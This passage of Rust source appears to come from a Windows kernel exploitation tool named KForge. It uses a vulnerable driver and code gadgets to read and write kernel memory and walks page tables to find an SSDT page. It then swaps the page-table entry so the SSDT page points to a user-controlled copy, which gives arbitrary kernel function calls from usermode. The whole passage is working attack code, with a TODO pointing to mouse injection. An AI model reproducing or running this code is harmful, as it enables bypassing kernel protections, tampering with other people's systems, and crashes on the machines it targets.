    // PML4E is at: pml4_kva + pml4_idx(entry_kva) * 8
    let pml4e_kva = pml4_kva + (pml4_idx(entry_kva) as u64) * 8;
    println!(
        "[*] PML4E kva = 0x{:X} (idx={})",
        pml4e_kva,
        pml4_idx(entry_kva)
    );

    // Read PML4E value via Superfetch + phys read (or KForge v1 if unmappable)
    let pml4e_val = {
        let pa = vc.va2pa(pml4e_kva);
        let direct = pa.and_then(|p| pcache.read8(p));
        match direct {
            Some(v) => {
                println!("[+] PML4E read via phys = 0x{:X}", v);
                v
            }
            None => {
                // PA is in unmappable range — use KForge v1 to read from kernel VA
                println!("[*] PML4E unmappable, reading via KForge v1 (mov rax,[rcx];ret)...");
                let read_gadget = g
                    .mov_rax_drcx_ret
                    .expect("[!] No mov rax,[rcx];ret gadget found");
                let mut val: u64 = 0;
                // Call the gadget as the "function": rcx = pml4e_kva
                // The gadget does: mov rax, [rcx]; ret → rax = value at pml4e_kva
                // The chain then stores rax to &val via mov [rcx], rax; ret
                match kcall_v1(
                    &mut vc,
                    &mut pcache,
                    &g,
                    kbase,
                    ksize,
                    fn_zw_term,
                    read_gadget,
                    &[pml4e_kva],
                    &mut val,
                ) {
                    Ok(v) => {
                        println!("[+] PML4E read via KForge v1 = 0x{:X}", v);
                        v
                    }
                    Err(e) => {
                        println!("[!] KForge v1 PML4E read failed: {}", e);
                        pcache.unmap_all();
                        return;
                    }
                }
            }
        }
    };
    println!("[+] PML4E = 0x{:X}", pml4e_val);
    if pml4e_val & PTE_PRESENT == 0 {
        println!("[!] PML4E not present!");
        return;
    }

    // ── Phase 6: Walk page tables to find PTE VA for SSDT page ──
    // Instead of copying entire PDP/PD/PT chain (512GB blast radius),
    // we find the exact PTE and swap just that one entry (4KB blast radius).
    println!("\n--- Phase 5: Find PTE for SSDT page ---");

    let read_gadget = g.mov_rax_drcx_ret.expect("[!] No mov rax,[rcx];ret gadget");

    // kread helper: read u64 from kernel VA via Superfetch+phys or KForge v1
    let kread = |vc: &mut VaCache, pcache: &mut PageCache, kva: u64| -> Option<u64> {
        if let Some(pa) = vc.va2pa(kva)
            && let Some(v) = pcache.read8(pa)
        {
            return Some(v);
        }
        let mut val: u64 = 0;
        kcall_v1(
            vc,
            pcache,
            &g,
            kbase,
            ksize,
            fn_zw_term,
            read_gadget,
            &[kva],
            &mut val,
        )
        .ok()?;
        Some(val)
    };

    // Walk: PML4E → PDPTE → PDE → PTE
    let pdp_pa = pml4e_val & PTE_PA_MASK;
    let mut pdp_kva: u64 = 0;
    kcall_v1(
        &mut vc,
        &mut pcache,
        &g,
        kbase,
        ksize,
        fn_zw_term,
        fn_mm_get_virt,
        &[pdp_pa],
        &mut pdp_kva,
    )
    .expect("MmGetVirtualForPhysical(PDP)");
    println!("[+] PDP kva = 0x{:X}", pdp_kva);

    let pdpte_kva = pdp_kva + (pdpt_idx(entry_kva) as u64) * 8;
    let pdpte = kread(&mut vc, &mut pcache, pdpte_kva).expect("read PDPTE");
    println!("[+] PDPTE[{}] = 0x{:X}", pdpt_idx(entry_kva), pdpte);
    if pdpte & PTE_PRESENT == 0 {
        println!("[!] PDPTE not present");
        return;
    }

    let pd_pa = pdpte & PTE_PA_MASK;
    let mut pd_kva: u64 = 0;
    kcall_v1(
        &mut vc,
        &mut pcache,
        &g,
        kbase,
        ksize,
        fn_zw_term,
        fn_mm_get_virt,
        &[pd_pa],
        &mut pd_kva,
    )
    .expect("MmGetVirtualForPhysical(PD)");
    println!("[+] PD kva = 0x{:X}", pd_kva);

    let pde_kva = pd_kva + (pd_idx(entry_kva) as u64) * 8;
    let pde = kread(&mut vc, &mut pcache, pde_kva).expect("read PDE");
    println!("[+] PDE[{}] = 0x{:X}", pd_idx(entry_kva), pde);
    if pde & PTE_PRESENT == 0 {
        println!("[!] PDE not present");
        return;
    }

    // Resolve MmPfnDatabase — needed for PFN refcount fixes.
    // Not exported on Win11 24H2+, but the VA is embedded as `mov rax, imm64`
    // in the first 32 bytes of MmGetVirtualForPhysical.  We read the LIVE
    // function bytes from kernel memory (not the PE on disk) because Win10
    // 19H1+ can randomize the PFN base at boot.
    // The imm64 is PfnBase + 8; we subtract 8.
    let pfn_db_base: u64 = {
        let mut found = 0u64;
        // Method 1: read 32 bytes of MmGetVirtualForPhysical from live kernel
        if fn_mm_get_virt != 0 {
            let mut body = [0u8; 32];
            let mut ok = true;
            for i in 0..4usize {
                match kread(&mut vc, &mut pcache, fn_mm_get_virt + (i as u64) * 8) {
                    Some(v) => body[i * 8..(i + 1) * 8].copy_from_slice(&v.to_le_bytes()),
                    None => { ok = false; break; }
                }
            }
            if ok {
                // Scan for 48 B8 xx xx xx xx xx xx xx xx (REX.W mov rax, imm64)
                for i in 0..body.len().saturating_sub(10) {
                    if body[i] == 0x48 && body[i + 1] == 0xB8 {
                        let imm = u64::from_le_bytes(body[i + 2..i + 10].try_into().unwrap());
                        if imm > 0xFFFF_0000_0000_0000 {
                            found = imm.wrapping_sub(8);
                            break;
                        }
                    }
                }
            }
        }
        // Method 2: fallback to export name (older builds that still export it)
        if found == 0 {
            let pfn_db_ptr_va = resolve(kbase, &kname, "MmPfnDatabase");
            if pfn_db_ptr_va != 0 {
                let mut val: u64 = 0;
                let _ = kcall_v1(
                    &mut vc, &mut pcache, &g, kbase, ksize,
                    fn_zw_term, read_gadget, &[pfn_db_ptr_va], &mut val,
                );
                found = val;
            }
        }
        if found != 0 {
            println!("[+] MmPfnDatabase = 0x{:X}", found);
        } else {
            println!("[*] MmPfnDatabase not found — PFN fix disabled");
        }
        found
    };

    const MMPFN_SIZE: u64 = 0x30;
    const MMPFN_REFCOUNT_OFF: u64 = 0x20;

    let pte_kva;
    let pte_val;
    let split_pde_kva: Option<u64>; // set if we split a 2MB page (need to restore PDE on cleanup)
    let original_pde: u64;
    let pt_page: Option<LockedPage>; // PT page we allocate for splitting

    if pde & PTE_LARGE != 0 {
        // 2MB large page — split into 512 4KB PTEs.
        // Allocate a PT page in usermode, populate with 512 entries that replicate
        // the large page mapping, then replace the PDE to point to our PT.
        // Blast radius: 2MB (this PDE's range only).
        println!("[*] 2MB large page detected, splitting into 4KB PTEs...");
        original_pde = pde;

        let pt = LockedPage::alloc(&mut vc).expect("alloc PT page for split");
        println!("[+] PT page: VA=0x{:X} PA=0x{:X}", pt.va as u64, pt.pa);

        // Large page base PA (bits 47:21 of PDE, bits 20:0 are zero for 2MB aligned)
        let large_base_pa = pde & 0x000F_FFFF_FFE0_0000;
        // Preserve flags from PDE but remove LARGE and GLOBAL, set appropriate PTE flags
        let pde_flags = pde & 0xFF00_0000_0000_0FFF;
        let pte_flags = (pde_flags & !PTE_LARGE & !PTE_GLOBAL) | 0x20; // add accessed

        for i in 0..512usize {
            let entry = (large_base_pa + (i as u64) * 0x1000) | pte_flags;
            pt.write_u64(i * 8, entry);
        }

        // The PTE for our target SSDT page
        let target_pt_idx = pt_idx(entry_kva);
        pte_val = pt.read_u64(target_pt_idx * 8);
        println!("[+] Split PTE[{}] = 0x{:X}", target_pt_idx, pte_val);

        // pte_kva: this is in OUR PT page (usermode), not a kernel VA
        // We'll modify it directly in our page, then swap the PDE.
        // The PTE "kva" concept doesn't apply here — we modify pt.va directly.
        pte_kva = 0; // unused for large page path
        split_pde_kva = Some(pde_kva);
        pt_page = Some(pt);

        // Fix PFN refcount for PT page (will be referenced by the PDE)
        if pfn_db_base != 0 {
            let pt_pfn = pt_page.as_ref().unwrap().pa >> 12;
            let pt_pfn_entry = pfn_db_base + pt_pfn * MMPFN_SIZE;
            let pt_rc_va = pt_pfn_entry + MMPFN_REFCOUNT_OFF;
            let pt_u3 = kread(&mut vc, &mut pcache, pt_rc_va).expect("read PT PFN refcount");
            let pt_old_rc = (pt_u3 & 0xFFFF) as u16;
            let pt_new_rc = pt_old_rc + 1;
            let pt_new_u3 = (pt_u3 & !0xFFFF) | (pt_new_rc as u64);
            println!(
                "[+] PT PFN=0x{:X} refcount {} -> {}",
                pt_pfn, pt_old_rc, pt_new_rc
            );
            kwrite_v1(
                &mut vc,
                &mut pcache,
                &g,
                kbase,
                ksize,
                fn_zw_term,
                pt_rc_va,
                pt_new_u3,
            )
            .expect("write PT PFN refcount");
        } // end if pfn_db_base != 0
    } else {
        // 4KB pages — PT page exists. Find PTE kernel VA.
        original_pde = pde;
        split_pde_kva = None;
        pt_page = None;

        let pt_pa = pde & PTE_PA_MASK;
        let mut pt_kva: u64 = 0;
        kcall_v1(
            &mut vc,
            &mut pcache,
            &g,
            kbase,
            ksize,
            fn_zw_term,
            fn_mm_get_virt,
            &[pt_pa],
            &mut pt_kva,
        )
        .expect("MmGetVirtualForPhysical(PT)");
        println!("[+] PT kva = 0x{:X}", pt_kva);

        pte_kva = pt_kva + (pt_idx(entry_kva) as u64) * 8;
        pte_val = kread(&mut vc, &mut pcache, pte_kva).expect("read PTE");
        println!(
            "[+] PTE[{}] @ kva 0x{:X} = 0x{:X}",
            pt_idx(entry_kva),
            pte_kva,
            pte_val
        );
        if pte_val & PTE_PRESENT == 0 {
            println!("[!] PTE not present");
            return;
        }
    }

    // ── Phase 6: Allocate data page + copy SSDT content ──
    println!("\n--- Phase 6: Data page setup ---");

    let mut data = LockedPage::alloc(&mut vc).expect("alloc data page");
    println!(
        "[+] Data page: VA=0x{:X} PA=0x{:X}",
        data.va as u64, data.pa
    );

    let ssdt_page_kva = entry_kva & !0xFFF;
    let data_page_pa = pte_val & PTE_PA_MASK;

    // Copy SSDT page content: try phys R/W first, fall back to kread
    let copy_ok = if pcache.read_page(data_page_pa, data.as_mut_slice()) {
        println!(
            "[+] SSDT page copied via phys R/W (PA=0x{:X})",
            data_page_pa
        );
        true
    } else {
        println!("[*] SSDT page PA unmappable, copying via KForge v1...");
        let mut ok = true;
        for i in 0..512usize {
            match kread(&mut vc, &mut pcache, ssdt_page_kva + (i as u64) * 8) {
                Some(v) => {
                    data.as_mut_slice()[i * 8..(i + 1) * 8].copy_from_slice(&v.to_le_bytes())
                }
                None => {
                    println!("[!] kread failed at offset {}", i * 8);
                    ok = false;
                    break;
                }
            }
        }
        ok
    };
    if !copy_ok {
        println!("[!] Failed to copy SSDT page");
        pcache.unmap_all();
        return;
    }

    let offset = (entry_kva & 0xFFF) as usize;
    let copied_entry = data.read_u32(offset);
    println!(
        "[+] Copied SSDT entry = 0x{:08X} (expected 0x{:08X})",
        copied_entry, target_entry
    );
    assert_eq!(copied_entry, target_entry, "SSDT copy mismatch!");

    // ── Phase 6b: Fix PFN refcount for data page ──
    println!("\n--- Phase 6b: PFN refcount fix ---");

    if pfn_db_base != 0 {
        let data_pfn = data.pa >> 12;
        let pfn_entry_va = pfn_db_base + data_pfn * MMPFN_SIZE;
        let refcount_va = pfn_entry_va + MMPFN_REFCOUNT_OFF;

        let u3_val = kread(&mut vc, &mut pcache, refcount_va).expect("read PFN refcount");
        let old_refcount = (u3_val & 0xFFFF) as u16;
        let new_refcount = old_refcount + 1;
        let new_u3_val = (u3_val & !0xFFFF) | (new_refcount as u64);
        println!(
            "[+] Data PFN=0x{:X} refcount {} -> {}",
            data_pfn, old_refcount, new_refcount
        );

        kwrite_v1(
            &mut vc,
            &mut pcache,
            &g,
            kbase,
            ksize,
            fn_zw_term,
            refcount_va,
            new_u3_val,
        )
        .expect("write PFN refcount");
    } else {
        println!("[*] PFN fix skipped (MmPfnDatabase not available)");
    }

    // ── Phase 7: Swap PTE/PDE via KForge v1 ──
    println!("\n--- Phase 7: PTE/PDE swap ---");

    if let Some(pde_kva_val) = split_pde_kva {
        // 2MB large page path: modify PTE in our PT page, then swap PDE
        let pt = pt_page.as_ref().unwrap();
        let target_pt_idx = pt_idx(entry_kva);

        // Modify PTE in our PT page to point to data page
        let new_pte = data.pa | (pte_val & 0xFF00_0000_0000_0FFF);
        pt.write_u64(target_pt_idx * 8, new_pte);
        println!(
            "[+] PT[{}] modified: 0x{:X} -> 0x{:X}",
            target_pt_idx, pte_val, new_pte
        );

        // New PDE: points to our PT page, 4KB pages (no LARGE flag)
        // Keep original flags but remove LARGE+GLOBAL, point to our PT PA
        let new_pde = pt.pa | PTE_TABLE_FLAGS;
        println!(
            "[*] PDE @ kva 0x{:X}: 0x{:X} -> 0x{:X}",
            pde_kva_val, original_pde, new_pde
        );

        kwrite_v1(
            &mut vc,
            &mut pcache,
            &g,
            kbase,
            ksize,
            fn_zw_term,
            pde_kva_val,
            new_pde,
        )
        .expect("PDE swap");
        println!("[+] PDE swapped! 2MB region now uses our PT with modified PTE");

        // Flush TLB so kernel sees our new PDE→PT→PTE mapping
        // Without this, cached TLB entries from the 2MB large page may persist
        let fn_flush_tb = resolve(kbase, &kname, "KeFlushEntireTb");
        if fn_flush_tb != 0 {
            let mut _dummy: u64 = 0;
            match kcall_v1(
                &mut vc,
                &mut pcache,
                &g,
                kbase,
                ksize,
                fn_zw_term,
                fn_flush_tb,
                &[],
                &mut _dummy,
            ) {
                Ok(_) => println!("[+] TLB flushed via KeFlushEntireTb"),
                Err(e) => println!("[!] TLB flush failed: {}", e),
            }
        } else {
            println!("[*] KeFlushEntireTb not found, TLB not flushed");
        }
    } else {
        // 4KB page path: directly swap the PTE
        let new_pte = data.pa | (pte_val & 0xFF00_0000_0000_0FFF);
        println!(
            "[*] PTE @ kva 0x{:X}: 0x{:X} -> 0x{:X}",
            pte_kva, pte_val, new_pte
        );

        kwrite_v1(
            &mut vc,
            &mut pcache,
            &g,
            kbase,
            ksize,
            fn_zw_term,
            pte_kva,
            new_pte,
        )
        .expect("PTE swap");
        println!("[+] PTE swapped! SSDT page now points to our data page");
    }

    // ── Bootstrap complete — build KCall, release phys cache ──
    pcache.unmap_all();
    drv.unload();
    println!(
        "[+] Bootstrap done. Driver unloaded. Phys maps: {}",
        pcache.map_count
    );

    let ntdll = unsafe { GetModuleHandleA(b"ntdll.dll\0".as_ptr()) };
    let syscall_fn = unsafe { GetProcAddress(ntdll, b"NtCreateTransaction\0".as_ptr()) }
        .expect("ntdll!NtCreateTransaction") as *const u8;

    let kcall = KCall {
        entry_ptr: unsafe { data.va.add(offset) as *mut u32 },
        ki_table_va,
        original_entry: target_entry,
        syscall_fn,
    };
    println!("[+] KCall ready — patch-on-demand, ~2μs window per call");

    // ── Demo: call DbgPrintEx(0, 0, "hello from KForge\\n") via patch-on-demand ──
    println!("\n--- Demo: patch-on-demand kernel call ---");
    let fn_dbg_print = resolve(kbase, &kname, "DbgPrintEx");
    if fn_dbg_print != 0 {
        let msg = b"[KForge] patch-on-demand call OK\n\0";
        let r = kcall.call_n(
            fn_dbg_print,
            &[
                0x4Du64,             // DPFLTR_IHVDRIVER_ID
                0,                   // level
                msg.as_ptr() as u64, // fmt string (usermode ptr OK in syscall ctx)
            ],
        );
        println!("[+] DbgPrintEx returned 0x{:X}", r);
    } else {
        println!("[*] DbgPrintEx not found, skipping demo");
    }

    // Verify SSDT slot is clean after call
    let slot_now = unsafe { *kcall.entry_ptr };
    assert_eq!(slot_now, target_entry, "SSDT slot not restored!");
    println!("[+] SSDT slot verified clean: 0x{:08X}", slot_now);

    // TODO: runtime loop here (mouse injection, etc.)
    println!("\nPress Enter to restore PTE/PDE and exit...");
    let _ = std::io::stdin().read_line(&mut String::new());

    // ── Cleanup: restore original PDE/PTE via one last patch-on-demand call ──
    println!("\n--- Cleanup ---");
    let fn_rtl_move = resolve(kbase, &kname, "RtlMoveMemory");

    if let Some(pde_kva_val) = split_pde_kva {
        println!("[*] Restoring original 2MB PDE...");
        let src = &original_pde as *const u64 as u64;
        kcall.call_n(fn_rtl_move, &[pde_kva_val, src, 8]);
        println!("[+] PDE restored to 2MB large page");
    } else {
        println!("[*] Restoring original PTE...");
        let src = &pte_val as *const u64 as u64;
        kcall.call_n(fn_rtl_move, &[pte_kva, src, 8]);
        println!("[+] PTE restored");
    }

    println!("[+] SSDT slot clean (was never permanently patched)");
    println!("\n=== KForge v2 complete ===");
}
